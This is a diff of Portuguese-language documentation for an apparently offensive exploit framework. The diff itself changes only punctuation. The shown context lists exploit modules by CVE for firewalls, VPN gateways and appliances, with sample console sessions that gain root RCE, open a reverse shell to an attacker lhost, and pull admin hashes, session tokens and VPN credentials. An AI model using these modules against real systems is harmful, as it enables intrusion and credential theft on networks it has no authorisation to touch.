@@ -95,7 +95,7 @@ exploits/firewalls/sonicwall/sonicos_sslvpn_auth_bypass_cve_2024_53704
 
 | Nome | CVE | CVSS | Tipo |
 |------|-----|------|------|
-| `checkpoint_vpn_lfi_chain_cve_2024_24919` | CVE-2024-24919 | 8.6 | LFI encadeado — leitura arbitrária de arquivo |
+| `checkpoint_vpn_lfi_chain_cve_2024_24919` | CVE-2024-24919 | 8.6 | LFI encadeado  -  leitura arbitrária de arquivo |
 | `security_gateway_info_disclosure_cve_2024_24919` | CVE-2024-24919 | 8.6 | Divulgação de informações (variante) |
 | `checkpoint_remote_code_exec_cve_2023_28461` | CVE-2023-28461 | 9.8 | RCE não autenticado |
 | `checkpoint_gaia_portal_sqli_cve_2021_30358` | CVE-2021-30358 | 9.8 | SQL injection no portal Gaia |
@@ -109,7 +109,7 @@ exploits/firewalls/checkpoint/checkpoint_gaia_portal_sqli_cve_2021_30358
 exploits/firewalls/checkpoint/endpoint_security_privesc_cve_2019_8461
 ```
 
-**Sessão terminal — CVE-2023-28461 (Check Point Quantum RCE):**
+**Sessão terminal  -  CVE-2023-28461 (Check Point Quantum RCE):**
 
 ```
 exf > use exploits/firewalls/checkpoint/checkpoint_remote_code_exec_cve_2023_28461
@@ -120,7 +120,7 @@ exf (Check Point Quantum Gateway RCE CVE-2023-28461) > set lhost 10.0.0.99
 exf (Check Point Quantum Gateway RCE CVE-2023-28461) > check
 [*] Verificando Check Point Quantum Security Gateway em 203.0.113.50:443...
 [+] Check Point Quantum R81.20 detectado (take 7)
-[+] Alvo vulnerável — R81.20 < Take 8 (limite de correção)
+[+] Alvo vulnerável  -  R81.20 < Take 8 (limite de correção)
 exf (Check Point Quantum Gateway RCE CVE-2023-28461) > run
 [*] Enviando requisição HTTPS malformada para a API de configuração de rede...
 [*] Payload aciona escrita fora dos limites no processo cpwd (escalada pós-autenticação)...
@@ -303,7 +303,7 @@ exploits/routers/huawei/hg8245_config_dump
 | Produto | CVEs | Tipo |
 |---------|------|------|
 | RouterOS < 6.42 | CVE-2018-14847 | Divulgação de creds via Winbox |
-| RouterOS qualquer | — | DNS Hijack APT28/Sandworm |
+| RouterOS qualquer |  -  | DNS Hijack APT28/Sandworm |
 
 ```
 exploits/routers/mikrotik/winbox_cred_disclosure_cve_2018_14847
@@ -319,7 +319,7 @@ exploits/routers/mikrotik/routeros_jailbreak
 |--------|---------|-----|--------|
 | Supermicro | IPMI 2.0 | CVE-2013-4786 | `exploits/bmc/supermicro/ipmi_auth_bypass_cve_2013_4786` |
 | Dell | iDRAC9 | CVE-2021-36300 | `exploits/bmc/dell/idrac9_info_disclosure_cve_2021_36300` |
-| ASUS | ASMB8 IPMI | — | `exploits/bmc/asus/asmb8_default_creds_ipmi` |
+| ASUS | ASMB8 IPMI |  -  | `exploits/bmc/asus/asmb8_default_creds_ipmi` |
 
 ---
 
@@ -343,7 +343,7 @@ exploits/appliances/f5/bigip_bigiq_icontrol_rce_cve_2021_22986
 |---------|-----|------|------|
 | NetScaler ADC/Gateway | CVE-2019-19781 | 9.8 | Path traversal (Shitrix) |
 | NetScaler ADC/Gateway | CVE-2023-3519 | 9.8 | RCE não autenticado |
-| NetScaler ADC/Gateway | CVE-2023-4966 | 9.4 | CitrixBleed — vazamento de token de sessão |
+| NetScaler ADC/Gateway | CVE-2023-4966 | 9.4 | CitrixBleed  -  vazamento de token de sessão |
 
 ```
 exploits/appliances/citrix/netscaler_path_traversal_cve_2019_19781
@@ -351,7 +351,7 @@ exploits/appliances/citrix/netscaler_rce_cve_2023_3519
 exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
 ```
 
-**Sessão terminal — CVE-2023-4966 (CitrixBleed):**
+**Sessão terminal  -  CVE-2023-4966 (CitrixBleed):**
 
 ```
 exf > use exploits/appliances/citrix/citrix_bleed_info_disclosure_cve_2023_4966
@@ -360,7 +360,7 @@ exf (CitrixBleed CVE-2023-4966) > set target 10.0.80.1
 exf (CitrixBleed CVE-2023-4966) > check
 [*] Verificando NetScaler em 10.0.80.1:443...
 [+] NetScaler ADC 14.1.8.40 detectado
-[+] Alvo vulnerável — versão < 14.1-8.50 (CitrixBleed)
+[+] Alvo vulnerável  -  versão < 14.1-8.50 (CitrixBleed)
 exf (CitrixBleed CVE-2023-4966) > run
 [*] Enviando requisição HTTP com Host header superdimensionado...
 [+] Resposta contém 264 bytes extras (memória fora dos limites)
@@ -382,7 +382,7 @@ exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
 exploits/nac/aruba/aruba_clearpass_sqli_cve_2022_37897
 ```
 
-**Sessão terminal — CVE-2023-25594 (ClearPass RCE não autenticado):**
+**Sessão terminal  -  CVE-2023-25594 (ClearPass RCE não autenticado):**
 
 ```
 exf > use exploits/nac/aruba/aruba_clearpass_rce_cve_2023_25594
@@ -393,10 +393,10 @@ exf (Aruba ClearPass RCE CVE-2023-25594) > set lhost 10.0.0.99
 exf (Aruba ClearPass RCE CVE-2023-25594) > check
 [*] Verificando Aruba ClearPass em 10.0.90.5:443...
 [+] ClearPass Policy Manager 6.11.4 detectado
-[+] Alvo vulnerável — versão < 6.11.5
+[+] Alvo vulnerável  -  versão < 6.11.5
 exf (Aruba ClearPass RCE CVE-2023-25594) > run
 [*] Explorando validação incorreta de entrada no handler de registro do portal guest...
-[+] Injeção de comando confirmada — uid=0(root)
+[+] Injeção de comando confirmada  -  uid=0(root)
 [*] Reverse shell para 10.0.0.99:4444 iniciado...
 [+] Shell recebido!
 exf (Aruba ClearPass RCE CVE-2023-25594) > shell
@@ -418,7 +418,7 @@ clearpass-primary.corp.internal
 exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
 ```
 
-**Sessão terminal — CVE-2019-13393 (Sangfor NGFW RCE não autenticado):**
+**Sessão terminal  -  CVE-2019-13393 (Sangfor NGFW RCE não autenticado):**
 
 ```
 exf > use exploits/firewalls/sangfor/sangfor_ngfw_unauth_rce_cve_2019_13393
@@ -429,7 +429,7 @@ exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > set lhost 10.0.0.99
 exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > check
 [*] Verificando portal de gerenciamento Sangfor NGFW em 10.0.70.1:443...
 [+] Sangfor NGFW detectado (título da página: "Sangfor NGFW")
-[+] Alvo vulnerável — endpoint de RCE pré-auth exposto
+[+] Alvo vulnerável  -  endpoint de RCE pré-auth exposto
 exf (Sangfor NGFW Unauth RCE CVE-2019-13393) > run
 [*] Enviando requisição não autenticada ao endpoint vulnerável da API de gerenciamento...
 [+] RCE confirmado (uid=0 na resposta)
@@ -456,7 +456,7 @@ exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
 exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
 ```
 
-**Sessão terminal — CVE-2023-46853 (OpenVPN AS REST API auth bypass):**
+**Sessão terminal  -  CVE-2023-46853 (OpenVPN AS REST API auth bypass):**
 
 ```text
 exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2023_46853
@@ -467,7 +467,7 @@ exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > set port 943
 exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > check
 [*] Verificando REST API do OpenVPN Access Server em 10.0.200.5:943...
 [+] OpenVPN Access Server 2.10.0 detectado (header X-AS-Version)
-[+] Alvo vulnerável — AS 2.10.0 < 2.11.1 (limite da correção)
+[+] Alvo vulnerável  -  AS 2.10.0 < 2.11.1 (limite da correção)
 exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > run
 [*] Estágio 1: Verificando REST API do OpenVPN AS...
 [+] OpenVPN Access Server confirmado em /api/v1/config/access_server/
@@ -491,7 +491,7 @@ exf (OpenVPN AS REST API Auth Bypass CVE-2023-46853) > run
 [+] Exploração CVE-2023-46853 concluída em 10.0.200.5:943
 ```
 
-**Sessão terminal — CVE-2022-0547 (OpenVPN AS injeção LDAP):**
+**Sessão terminal  -  CVE-2022-0547 (OpenVPN AS injeção LDAP):**
 
 ```text
 exf > use exploits/firewalls/openvpn/openvpn_as_auth_bypass_cve_2022_0547
@@ -517,13 +517,13 @@ exf (OpenVPN AS LDAP Auth Bypass CVE-2022-0547) > run
 
 | Produto | CVE | CVSS | Tipo |
 |---------|-----|------|------|
-| Arista EOS 4.24.x–4.27.x (eAPI habilitado) | CVE-2023-24512 | 9.8 | Bypass de auth REST API (eAPI) + execução de CLI |
+| Arista EOS 4.24.x-4.27.x (eAPI habilitado) | CVE-2023-24512 | 9.8 | Bypass de auth REST API (eAPI) + execução de CLI |
 
 ```
 exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
 ```
 
-**Sessão terminal — CVE-2023-24512 (Arista EOS REST API bypass):**
+**Sessão terminal  -  CVE-2023-24512 (Arista EOS REST API bypass):**
 
 ```text
 exf > use exploits/firewalls/arista/arista_eos_rest_api_bypass_cve_2023_24512
@@ -532,7 +532,7 @@ exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > set target 10.0.210.1
 exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > check
 [*] Verificando eAPI do Arista EOS em 10.0.210.1:443...
 [+] Arista EOS 4.27.3M detectado (fingerprint eAPI confirmado)
-[+] Alvo vulnerável — EOS 4.27.3M < 4.27.4M (limite da correção)
+[+] Alvo vulnerável  -  EOS 4.27.3M < 4.27.4M (limite da correção)
 exf (Arista EOS REST API Auth Bypass CVE-2023-24512) > run
 [*] Estágio 1: Verificando endpoint eAPI do Arista EOS...
 [+] Versão Arista EOS: 4.27.3M
@@ -582,7 +582,7 @@ O módulo `embedxpl-printer-vuln.nse` verifica 11 vendors de impressoras (HP, Ca
 
 ---
 
-## Firewalls, UTM e Appliances de Rede — Vendors Adicionais
+## Firewalls, UTM e Appliances de Rede  -  Vendors Adicionais
 
 ### Sophos
 
@@ -598,7 +598,7 @@ exploits/firewalls/sophos/xg_auth_bypass_cve_2022_1040
 exploits/firewalls/sophos/xg_sqli_asnarok_cve_2020_12271
 ```
 
-**Sessão terminal — CVE-2020-12271 (Sophos XG SQLi Asnarok):**
+**Sessão terminal  -  CVE-2020-12271 (Sophos XG SQLi Asnarok):**
 
 ```
 exf > use exploits/firewalls/sophos/xg_sqli_asnarok_cve_2020_12271
@@ -607,10 +607,10 @@ exf (Sophos XG SQLi Asnarok CVE-2020-12271) > set target 10.0.50.1
 exf (Sophos XG SQLi Asnarok CVE-2020-12271) > check
 [*] Verificando Sophos XG em 10.0.50.1:443...
 [+] Sophos XG Firewall v17.5 MR12 detectado
-[+] Alvo vulnerável — endpoint SQLi Asnarok (/userman/) exposto
+[+] Alvo vulnerável  -  endpoint SQLi Asnarok (/userman/) exposto
 exf (Sophos XG SQLi Asnarok CVE-2020-12271) > run
 [*] Injetando SQL no endpoint /userportal/Controller?mode=30&product=...
-[+] SQLi confirmado — extraindo credenciais de administrador do PostgreSQL...
+[+] SQLi confirmado  -  extraindo credenciais de administrador do PostgreSQL...
 [+] Hash do admin: $apr1$R3Ks7Z1B$...
 [+] Sessão admin: 3a4b5c6d-7e8f-9012-abcd-ef1234567890
 [*] Extraindo credenciais VPN do banco sqlite...
@@ -625,7 +625,7 @@ exf (Sophos XG SQLi Asnarok CVE-2020-12271) > run
 |------|-----|------|------|
 | `firebox_auth_bypass_cve_2022_26776` | CVE-2022-26776 | 9.8 | Bypass de autenticação |
 | `firebox_cyclops_blink_cve_2022_23176` | CVE-2022-23176 | 8.8 | Implante Cyclops Blink (estado-nação) |
-| `xcs_9_rce` | — | Crítico | RCE no WatchGuard XCS 9.x |
+| `xcs_9_rce` |  -  | Crítico | RCE no WatchGuard XCS 9.x |
 
 ```
 exploits/firewalls/watchguard/firebox_auth_bypass_cve_2022_26776
@@ -704,7 +704,7 @@ exploits/firewalls/stormshield/stormshield_sns_auth_bypass_cve_2023_23770
 | Nome | CVE | CVSS | Tipo |
 |------|-----|------|------|
 | `vyos_rce_cve_2023_31992` | CVE-2023-31992 | 9.8 | RCE via API REST |
-| `vyos_openvpn_injection_cve_2021_35278` | CVE-2021-35278 | 8.8 | Injeção de configuração OpenVPN — execução de comando OS |
+| `vyos_openvpn_injection_cve_2021_35278` | CVE-2021-35278 | 8.8 | Injeção de configuração OpenVPN  -  execução de comando OS |
 
 ```
 exploits/firewalls/vyos/vyos_rce_cve_2023_31992
@@ -778,16 +778,16 @@ Vendor chinês amplamente implantado em ambientes governamentais e corporativos.
 | `h3c_ngfw_rce_cve_2022_35534` | CVE-2022-35534 | 9.8 | Injeção de comando OS no NGFW |
 | `h3c_secpath_auth_bypass_cve_2019_20224` | CVE-2019-20224 | 9.8 | Bypass de autenticação SecPath |
 
-**Sessão terminal — CVE-2022-35534 (H3C NGFW RCE):**
+**Sessão terminal  -  CVE-2022-35534 (H3C NGFW RCE):**
 
 ```
 exf > use exploits/firewalls/h3c/h3c_ngfw_rce_cve_2022_35534
 exf (H3C NGFW RCE CVE-2022-35534) > set target 192.168.1.1
 [+] target => 192.168.1.1
 exf (H3C NGFW RCE CVE-2022-35534) > run
-[*] Etapa 1 — Detectando interface de gerenciamento web H3C NGFW...
+[*] Etapa 1  -  Detectando interface de gerenciamento web H3C NGFW...
 [+] Interface de gerenciamento H3C detectada
-[*] Etapa 2 — Injetando comando via configuração de rede...
+[*] Etapa 2  -  Injetando comando via configuração de rede...
 [+] RCE confirmado: uid=0(root)
 ```
 
@@ -800,7 +800,7 @@ exf (H3C NGFW RCE CVE-2022-35534) > run
 | `array_networks_vxag_rce_cve_2023_28461` | CVE-2023-28461 | 9.8 | RCE não autenticado via exec proxy |
 | `array_networks_arrayos_rce_cve_2021_43139` | CVE-2021-43139 | 9.8 | Injeção de campo POST pré-autenticada |
 
-**Sessão terminal — CVE-2023-28461 (Array Networks vxAG RCE não autenticado):**
+**Sessão terminal  -  CVE-2023-28461 (Array Networks vxAG RCE não autenticado):**
 
 ```
 exf > use exploits/firewalls/array_networks/array_networks_vxag_rce_cve_2023_28461
@@ -809,11 +809,11 @@ exf (Array Networks vxAG RCE CVE-2023-28461) > set target 10.0.0.1
 exf (Array Networks vxAG RCE CVE-2023-28461) > check
 [*] Identificando Array Networks vxAG em 10.0.0.1:443...
 [+] Array Networks vxAG detectado
-[+] Alvo vulnerável — endpoint de exec proxy exposto sem autenticação
+[+] Alvo vulnerável  -  endpoint de exec proxy exposto sem autenticação
 exf (Array Networks vxAG RCE CVE-2023-28461) > run
-[*] Etapa 1 — Identificando interface de gerenciamento Array Networks vxAG...
+[*] Etapa 1  -  Identificando interface de gerenciamento Array Networks vxAG...
 [+] Interface de gerenciamento detectada
-[*] Etapa 2 — Enviando requisição de exec proxy não autenticada...
+[*] Etapa 2  -  Enviando requisição de exec proxy não autenticada...
 [+] RCE CONFIRMADO! Saída do comando: uid=0(root)
 ```
 
